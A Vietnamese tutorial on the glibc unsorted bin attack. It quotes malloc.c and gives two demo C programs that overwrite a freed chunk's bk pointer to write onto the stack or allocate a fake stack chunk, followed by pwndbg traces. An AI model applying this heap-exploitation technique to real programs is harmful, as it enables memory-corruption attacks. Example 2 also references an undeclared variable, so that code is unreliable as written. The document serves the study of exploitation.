# Unsorted bin attack

-	để hiểu rõ được kĩ thuật này, người đọc cần phải hiểu cách mà `malloc()` xóa chunk từ list của unsorted bin khi ta reallocate chunk đã `malloc()` ở trong unsorted bin.
-	khi ta yêu cầu cấp phát bộ nhớ cho `malloc()`, allocator sẽ kiểm tra xem nếu yêu cầu ấy phù hợp với fastbin, small bin, hay large bin.
-	Nếu không, allocator sẽ kiểm tra xem nếu giá trị lưu bởi unsorted_chunks (av)->bk và giá trị trả về của unsorted_chunks (av) có khác nhau không.
	-	Nếu khác, thì có chunk trống trong unsorted bin.
	-	Nếu có free chunk trong unsorted bin, giá trị của unsorted_chunks->bk được lưu vào victim.
	-	Và data của vimtim -> bk được lưu vào bck.

```c
//  /release/2.25/master/malloc/malloc.c - _int_malloc()`
for (;; )
  {
    int iters = 0;
    while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
      {
        bck = victim->bk;
```

-	Unsorted_chunks (av) gọi bin_at() và trả về giá trị.
	-	Bin_at() trả về giá trị của `main_arena.bin[0] - 0x10`.

```c
//  /release/2.25/master/malloc/malloc.c

/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */
#define unsorted_chunks(M)          (bin_at (M, 1))
```
```c
//  /release/2.25/master/malloc/malloc.c

/* addressing -- note that bin_at(0) does not exist */
#define bin_at(m, i) \
  (mbinptr) (((char *) &((m)->bins[((i) - 1) * 2]))                \
             - offsetof (struct malloc_chunk, fd))
```

-	allocator sẽ reallocate các chunks đã nằm trong unsorted bin, sau đó lưu giá trị của bck vào `main_arena.bin[0]->bk` khi xóa chunk khỏi list.
	-	Và allocator lưu giá trị trả về bởi unsorted_chunks() vào bck->fd.

```c
//  /release/2.25/master/malloc/malloc.c - _int_malloc()

/* remove from unsorted list */
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);
```

-	Lấy ví dụ giá trị trả về bởi unsorted_chunks (av) là 0x7ffff7dd1b78, và giá trị trả về unsorted_chunks (av)->bk là 0x602000.
	-	Bởi vì 2 giá trị khác nhau, nên địa chỉ	0x00007ffff7dd1b78 chứa "0x602000->bk" vào bck.
-	Và allocator reallocate chunk của unsorted list.
	-	Để xóa chunk khỏi list, allocator lưu 0x00007ffff7dd1b78 được giữ bởi bck vào unsorted_chunks (av)->bk.
	-	Và giá trị trả về bởi unsorted_chunks(av) (0x7ffff7dd1b78) được lưu vào bck→fd.

![](https://i.imgur.com/1iufFdS.png)

-	Unsorted bin attack là kĩ thuật mà trong đó địa chỉ của main_arena ("&main_arena.bin[0]-16") được lưu trữ vào vùng mong muốn bằng cách ghi đè bk của free chunk trước khi chunk allocator xóa chunk đó ra khỏi unsorted list.
-	Nếu attacker ghi đè địa chỉ stack `0x7fffffffe248` bằng bk của chunk đã có trong unsorted list, allocator sẽ địa chỉ trả về bởi unsorted_chunks () trong bck → fd (0x7fffffffe258) vì địa chỉ được lưu trữ trong bck là 0x7fffffffe248.  

![](https://i.imgur.com/LB2e6Wm.png)

# Example
## Example 1
-	Luồng thực thi của đoạn code sau:
	-	Tạo 1 biến state (dùng để xem địa chỉ stack), malloc 2 vùng nhớ unsorted bin, sau đó free vùng nhớ 1.
	-	Sau khi lưu giá trị đã được tính toán của `((char*)&state)-16" in buf1[1]`, yêu cầu cấp phát tiếp 1 vùng nhớ mới.
	-	nếu state có giá trị, in ra giá trị đó
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
  
int main(){
    unsigned long long state = 0;
  
    fprintf(stderr,"Stack : %p\n", &state);
    unsigned long long *buf1 = malloc(130);
    char *buf2 = malloc(500);
  
    free(buf1);
  
    buf1[1] = (unsigned long long)(((char*)&state) - 16);
    buf1 = malloc(130);
  
    if(state){
        fprintf(stderr,"Hello world!\n");
    }
}
```
-	Kiểm tra địa chỉ của vùng nhớ được cấp phát tại địa chỉ 0x4006ec, 0x4006fa.
	-	Kiểm tra data của fd,bk của chunk đã được register trong unsorted list tại địa chỉ 0x40070a.
	-	Tại 0x40017a, check giá trị ghi đè bk của free chunk có phải unsorted bin attack hay không.
	-	Check địa chỉ của main arena tại 0x400727 được lưu vào trong stack.

>set breakpoint
```bash
tinnt@ubuntu:~/research/heap/unsorted-bin$ gdb -q unsorted-bin 
Reading symbols from unsorted-bin...(no debugging symbols found)...done.
pwndbg> disassemble main
Dump of assembler code for function main:
   0x00000000004006a6 <+0>:	push   rbp
   0x00000000004006a7 <+1>:	mov    rbp,rsp
   0x00000000004006aa <+4>:	sub    rsp,0x20
   0x00000000004006ae <+8>:	mov    rax,QWORD PTR fs:0x28
   0x00000000004006b7 <+17>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004006bb <+21>:	xor    eax,eax
   0x00000000004006bd <+23>:	mov    QWORD PTR [rbp-0x20],0x0
   0x00000000004006c5 <+31>:	mov    rax,QWORD PTR [rip+0x200994]        # 0x601060 <stderr@@GLIBC_2.2.5>
   0x00000000004006cc <+38>:	lea    rdx,[rbp-0x20]
   0x00000000004006d0 <+42>:	mov    esi,0x4007f4
   0x00000000004006d5 <+47>:	mov    rdi,rax
   0x00000000004006d8 <+50>:	mov    eax,0x0
   0x00000000004006dd <+55>:	call   0x400570 <fprintf@plt>
   0x00000000004006e2 <+60>:	mov    edi,0x82
   0x00000000004006e7 <+65>:	call   0x400580 <malloc@plt>
   0x00000000004006ec <+70>:	mov    QWORD PTR [rbp-0x18],rax
   0x00000000004006f0 <+74>:	mov    edi,0x1f4
   0x00000000004006f5 <+79>:	call   0x400580 <malloc@plt>
   0x00000000004006fa <+84>:	mov    QWORD PTR [rbp-0x10],rax
   0x00000000004006fe <+88>:	mov    rax,QWORD PTR [rbp-0x18]
   0x0000000000400702 <+92>:	mov    rdi,rax
   0x0000000000400705 <+95>:	call   0x400540 <free@plt>
   0x000000000040070a <+100>:	mov    rax,QWORD PTR [rbp-0x18]
   0x000000000040070e <+104>:	lea    rdx,[rax+0x8]
   0x0000000000400712 <+108>:	lea    rax,[rbp-0x20]
   0x0000000000400716 <+112>:	sub    rax,0x10
   0x000000000040071a <+116>:	mov    QWORD PTR [rdx],rax
   0x000000000040071d <+119>:	mov    edi,0x82
   0x0000000000400722 <+124>:	call   0x400580 <malloc@plt>
   0x0000000000400727 <+129>:	mov    QWORD PTR [rbp-0x18],rax
   0x000000000040072b <+133>:	mov    rax,QWORD PTR [rbp-0x20]
   0x000000000040072f <+137>:	test   rax,rax
   0x0000000000400732 <+140>:	je     0x400752 <main+172>
   0x0000000000400734 <+142>:	mov    rax,QWORD PTR [rip+0x200925]        # 0x601060 <stderr@@GLIBC_2.2.5>
   0x000000000040073b <+149>:	mov    rcx,rax
   0x000000000040073e <+152>:	mov    edx,0xd
   0x0000000000400743 <+157>:	mov    esi,0x1
   0x0000000000400748 <+162>:	mov    edi,0x400800
   0x000000000040074d <+167>:	call   0x400590 <fwrite@plt>
   0x0000000000400752 <+172>:	mov    eax,0x0
   0x0000000000400757 <+177>:	mov    rcx,QWORD PTR [rbp-0x8]
   0x000000000040075b <+181>:	xor    rcx,QWORD PTR fs:0x28
   0x0000000000400764 <+190>:	je     0x40076b <main+197>
   0x0000000000400766 <+192>:	call   0x400550 <__stack_chk_fail@plt>
   0x000000000040076b <+197>:	leave  
   0x000000000040076c <+198>:	ret    
End of assembler dump.
pwndbg> b*0x00000000004006ec
Breakpoint 1 at 0x4006ec
pwndbg> b*0x00000000004006fa
Breakpoint 2 at 0x4006fa
pwndbg> b*0x000000000040070a
Breakpoint 3 at 0x40070a
pwndbg> b*0x000000000040071a
Breakpoint 4 at 0x40071a
pwndbg> b*0x0000000000400727
Breakpoint 5 at 0x400727
pwndbg>
```

-	Binary yêu cầu cấp phát 2 vùng nhớ.
	-	Mỗi vùng nhớ có địa chỉ là 0x602010, 0x6020a0.

>allocating memory
```bash
pwndbg> r
Starting program: /home/tinnt/research/heap/unsorted-bin/unsorted-bin 
Stack : 0x7fffffffde40

Breakpoint 1, 0x00000000004006ec in main ()
pwndbg> i r rax
rax            0x602010	6299664
pwndbg> c
Continuing.

Breakpoint 2, 0x00000000004006fa in main ()
pwndbg> i r rax
rax            0x6020a0	6299808
pwndbg>
```

-	khi yêu cầu free() để giải phóng vùng nhớ đầu tiên (0x602010), chunk sẽ được đặt vào unsorted list
	-	`(char*)&main_arena.bins[0]-16` được lưu vào fd, bk của chunk

>after freeing memory
```bash
pwndbg> c
Continuing.

Breakpoint 3, 0x000000000040070a in main ()
pwndbg> p main_arena.bins[0]
$1 = (mchunkptr) 0x602000
pwndbg> x/4gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000091
0x602010:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
pwndbg> x/4gx 0x00007ffff7dd1b78
0x7ffff7dd1b78 <main_arena+88>:		0x0000000000602290	0x0000000000000000
0x7ffff7dd1b88 <main_arena+104>:	0x0000000000602000	0x0000000000602000

```

-	Để thực hiện unsorted bin attack, địa chỉ của stack được lưu vào bk của free chunk.

>ghi đè giá trị của `bck->fd`

```bash
pwndbg> c
Continuing.

Breakpoint 4, 0x000000000040071a in main ()
pwndbg> i r rdi rdx
rdi            0x7ffff7dd1b20	140737351850784
rdx            0x602018	6299672
pwndbg> x/i $rip
=> 0x40071a <main+116>:	mov    QWORD PTR [rdx],rax
pwndbg> ni
0x000000000040071d in main ()
pwndbg> x/4gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000091
0x602010:	0x00007ffff7dd1b78	0x00007fffffffde30
pwndbg> x/4g 0x00007fffffffde30
0x7fffffffde30:	0x00007fffffffdf40	0x000000000040070a
0x7fffffffde40:	0x0000000000000000	0x0000000000602010
pwndbg> 
```

-	Yêu cầu cấp phát bộ nhớ từ malloc() được đặt vào unsorted list.
	-	Sau khi cấp phát, `&main_arena[0]-16` được lưu vào biến `state` (0x7fffffffde40).
	-	vì giá trị biến state != 0, nên sẽ in ra dòng thông báo.

>lưu giá trị vào trong stack

```bash
pwndbg> c
Continuing.

Breakpoint 5, 0x0000000000400727 in main ()
pwndbg> i r  rax
rax            0x602010	6299664
pwndbg> p main_arena.bins[0]
$2 = (mchunkptr) 0x602000
pwndbg> x/4gx 0x602000 
0x602000:	0x0000000000000000	0x0000000000000091
0x602010:	0x00007ffff7dd1b78	0x00007fffffffde30
pwndbg> p main_arena.bins[1]
$3 = (mchunkptr) 0x7fffffffde30
pwndbg> x/4gx 0x7fffffffde30
0x7fffffffde30:	0x00007fffffffde60	0x0000000000400727
0x7fffffffde40:	0x00007ffff7dd1b78	0x0000000000602010
pwndbg> c
Continuing.
Hello world!
[Inferior 1 (process 12410) exited normally]
pwndbg> 
```
## Example 2

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
  
int main(){
    unsigned long long stack_var[3] = {0};
 
    fprintf(stderr,"Stack : %p\n", &state);
    unsigned long long *buf1 = malloc(130);
    char *buf2 = malloc(500);
  
    free(buf1);
 
    stack_var[0] = 0x90;
    stack_var[2] = (unsigned long long)stack_var;
 
    buf1[1] = (unsigned long long)(((char*)&stack_var) - 8);
    buf1 = malloc(130);
    char *buf3 = malloc(130);
  
    read(STDIN_FILENO,buf3,130);
}
```
>set breakpoints
```bash
tinnt@ubuntu:~/research/heap/unsorted-bin$ gdb unsorted-bin-into-stack -q
pwndbg: loaded 191 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from unsorted-bin-into-stack...(no debugging symbols found)...done.
pwndbg> disassemble main
Dump of assembler code for function main:
   0x00000000004006a6 <+0>:	push   rbp
   0x00000000004006a7 <+1>:	mov    rbp,rsp
   0x00000000004006aa <+4>:	sub    rsp,0x40
   0x00000000004006ae <+8>:	mov    rax,QWORD PTR fs:0x28
   0x00000000004006b7 <+17>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004006bb <+21>:	xor    eax,eax
   0x00000000004006bd <+23>:	mov    QWORD PTR [rbp-0x20],0x0
   0x00000000004006c5 <+31>:	mov    QWORD PTR [rbp-0x18],0x0
   0x00000000004006cd <+39>:	mov    QWORD PTR [rbp-0x10],0x0
   0x00000000004006d5 <+47>:	mov    rax,QWORD PTR [rip+0x200984]        # 0x601060 <stderr@@GLIBC_2.2.5>
   0x00000000004006dc <+54>:	lea    rdx,[rbp-0x20]
   0x00000000004006e0 <+58>:	mov    esi,0x400814
   0x00000000004006e5 <+63>:	mov    rdi,rax
   0x00000000004006e8 <+66>:	mov    eax,0x0
   0x00000000004006ed <+71>:	call   0x400580 <fprintf@plt>
   0x00000000004006f2 <+76>:	mov    edi,0x82
   0x00000000004006f7 <+81>:	call   0x400590 <malloc@plt>
   0x00000000004006fc <+86>:	mov    QWORD PTR [rbp-0x38],rax
   0x0000000000400700 <+90>:	mov    edi,0x1f4
   0x0000000000400705 <+95>:	call   0x400590 <malloc@plt>
   0x000000000040070a <+100>:	mov    QWORD PTR [rbp-0x30],rax
   0x000000000040070e <+104>:	mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400712 <+108>:	mov    rdi,rax
   0x0000000000400715 <+111>:	call   0x400540 <free@plt>
   0x000000000040071a <+116>:	mov    QWORD PTR [rbp-0x20],0x90
   0x0000000000400722 <+124>:	lea    rax,[rbp-0x20]
   0x0000000000400726 <+128>:	mov    QWORD PTR [rbp-0x10],rax
   0x000000000040072a <+132>:	mov    rax,QWORD PTR [rbp-0x38]
   0x000000000040072e <+136>:	lea    rdx,[rax+0x8]
   0x0000000000400732 <+140>:	lea    rax,[rbp-0x20]
   0x0000000000400736 <+144>:	sub    rax,0x8
   0x000000000040073a <+148>:	mov    QWORD PTR [rdx],rax
   0x000000000040073d <+151>:	mov    edi,0x82
   0x0000000000400742 <+156>:	call   0x400590 <malloc@plt>
   0x0000000000400747 <+161>:	mov    QWORD PTR [rbp-0x38],rax
   0x000000000040074b <+165>:	mov    edi,0x82
   0x0000000000400750 <+170>:	call   0x400590 <malloc@plt>
   0x0000000000400755 <+175>:	mov    QWORD PTR [rbp-0x28],rax
   0x0000000000400759 <+179>:	mov    rax,QWORD PTR [rbp-0x28]
   0x000000000040075d <+183>:	mov    edx,0x82
   0x0000000000400762 <+188>:	mov    rsi,rax
   0x0000000000400765 <+191>:	mov    edi,0x0
   0x000000000040076a <+196>:	call   0x400560 <read@plt>
   0x000000000040076f <+201>:	mov    eax,0x0
   0x0000000000400774 <+206>:	mov    rcx,QWORD PTR [rbp-0x8]
   0x0000000000400778 <+210>:	xor    rcx,QWORD PTR fs:0x28
   0x0000000000400781 <+219>:	je     0x400788 <main+226>
   0x0000000000400783 <+221>:	call   0x400550 <__stack_chk_fail@plt>
   0x0000000000400788 <+226>:	leave  
   0x0000000000400789 <+227>:	ret    
End of assembler dump.
pwndbg> b*0x000000000040071a
Breakpoint 1 at 0x40071a
pwndbg> b*0x000000000040073a
Breakpoint 2 at 0x40073a
pwndbg> b*0x0000000000400747
Breakpoint 3 at 0x400747
pwndbg> b*0x0000000000400755
Breakpoint 4 at 0x400755
pwndbg> b*0x000000000040076a
Breakpoint 5 at 0x40076a
pwndbg> 
```

-	Binary yêu cầu cấp phát 2 vùng nhớ và giải phóng vùng nhớ đầu tiên.
	-	vùng được giải phóng (0x602000) được đặt vào unsorted list

>place chunks in unsorted bin
```bash
pwndbg> r
Starting program: /home/tinnt/research/heap/unsorted-bin/unsorted-bin-into-stack 
Stack : 0x7fffffffde20

Breakpoint 1, 0x000000000040071a in main ()
pwndbg> p main_arena.bins[0] 
$1 = (mchunkptr) 0x602000
pwndbg> p main_arena.bins[1] 
$2 = (mchunkptr) 0x602000
pwndbg> x/4gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000091
0x602010:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
pwndbg> x/4gx 0x00007ffff7dd1b78
0x7ffff7dd1b78 <main_arena+88>:		0x0000000000602290	0x0000000000000000
0x7ffff7dd1b88 <main_arena+104>:	0x0000000000602000	0x0000000000602000
pwndbg> 
```

-	để cấp phát bộ nhớ (stack) thông qua kĩ thuật này, chúng ta cần 1 fake chunk ở dạng giống như chunk được yêu cầu trên stack
	-	Chương trình lưu trữ 0x90 trong stack_var [0]\(0x7fffffffde20) và địa chỉ của stack_var trong stack_var [2]\(0x7fffffffde30) để tạo 1 fake chunk.
	-	0x7fffffffde30 trở thành size của fake chunk, và 0x7fffffffde20 trở thành bk.

>create fake chunk
```bash
pwndbg> x/3i $rip
=> 0x40071a <main+116>:	mov    QWORD PTR [rbp-0x20],0x90
   0x400722 <main+124>:	lea    rax,[rbp-0x20]
   0x400726 <main+128>:	mov    QWORD PTR [rbp-0x10],rax
pwndbg> i r rbp
rbp            0x7fffffffde40	0x7fffffffde40
pwndbg> p/x 0x7fffffffde40 - 0x20
$3 = 0x7fffffffde20
pwndbg> ni

0x0000000000400722 in main ()
pwndbg> 

0x0000000000400726 in main ()
pwndbg> x/i $rip
=> 0x400726 <main+128>:	mov    QWORD PTR [rbp-0x10],rax
pwndbg> i r rbp
rbp            0x7fffffffde40	0x7fffffffde40
pwndbg> p/x 0x7fffffffde40 - 0x10
$4 = 0x7fffffffde30
pwndbg> i r rax
rax            0x7fffffffde20	140737488346656
pwndbg> ni
0x000000000040072a in main ()
pwndbg> x/4gx 0x7fffffffde20
0x7fffffffde20:	0x0000000000000090	0x0000000000000000
0x7fffffffde30:	0x00007fffffffde20	0xf81dc567ad284200
pwndbg> 
```

-	Lưu địa chỉ của fake chunk (0x7fffffffde18) vào main_arena.bins[0]->bk(0x602018).
	-	vì điều này, data lưu ở main_arena.bins[0]->bk trở thành địa chỉ của fake chunk (0x7fffffffde18).

>Store the address of the fake chunk in the main_rena.bins[ 0 ]->bk.
```bash
pwndbg> c
Continuing.

Breakpoint 2, 0x000000000040073a in main ()
pwndbg> x/i $rip
=> 0x40073a <main+148>:	mov    QWORD PTR [rdx],rax
pwndbg> i r rdx rax
rdx            0x602018	6299672
rax            0x7fffffffde18	140737488346648
pwndbg> x/4gx 0x7fffffffde18
0x7fffffffde18:	0x0000000000000000	0x0000000000000090
0x7fffffffde28:	0x0000000000000000	0x00007fffffffde20
pwndbg> p &main_arena.bins[0]->bk
$6 = (struct malloc_chunk **) 0x602018
pwndbg> ni

0x000000000040073d in main ()
pwndbg> p main_arena.bins[0]->bk
$7 = (struct malloc_chunk *) 0x7fffffffde18
pwndbg> x/4gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000091
0x602010:	0x00007ffff7dd1b78	0x00007fffffffde18
pwndbg>
```

-	Khi yêu cầu malloc() để cấp phát 1 vùng nhớ 130bytes, allocator reallocate chunks được đặt trong unsorted bin
	-	Allocator loại bỏ chunk từ unsorted bin sau khi reallocate, và update list của unsorted bin.
	-	Điều này dẫn đến địa chỉ của fake chunk lưu vào main_arena.bins[1].
-	Và 1 lần nữa, nếu yêu cầu cấp phát bộ nhớ có cùng kích thước stack (0x7fffffffde18) được trả về.
	-	Địa chỉ đó là địa chỉ của fake chunk -> fd.

>Memory is allocated in the stack space.
```bash
pwndbg> c
Continuing.

Breakpoint 3, 0x0000000000400747 in main ()
pwndbg> i r rax
rax            0x602010	6299664
pwndbg> p main_arena.bins[0]
$9 = (mchunkptr) 0x602000
pwndbg> p main_arena.bins[1]
$10 = (mchunkptr) 0x7fffffffde18
pwndbg> c
Continuing.

Breakpoint 4, 0x0000000000400755 in main ()
pwndbg> i r rax
rax            0x7fffffffde28	140737488346664
pwndbg> x/4gx 0x7fffffffde28
0x7fffffffde28:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x7fffffffde38:	0x4830ac2c0abceb00	0x0000000000400790
pwndbg> p main_arena.bins[1]
$11 = (mchunkptr) 0x7fffffffde20
pwndbg> 
```

-	bạn có thể lưu giá trị vào trong vùng nhớ đã được cấp phát vào stack.

```bash
pwndbg> c
Continuing.

Breakpoint 5, 0x000000000040076a in main ()
pwndbg> i r rsi
rsi            0x7fffffffde28	140737488346664
pwndbg> ni
AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD
0x000000000040076f in main ()
pwndbg> x/4gx 0x7fffffffde28
0x7fffffffde28:	0x4141414141414141	0x4242424242424242
0x7fffffffde38:	0x4343434343434343	0x4444444444444444
pwndbg> 
```

## References
https://github.com/shellphish/how2heap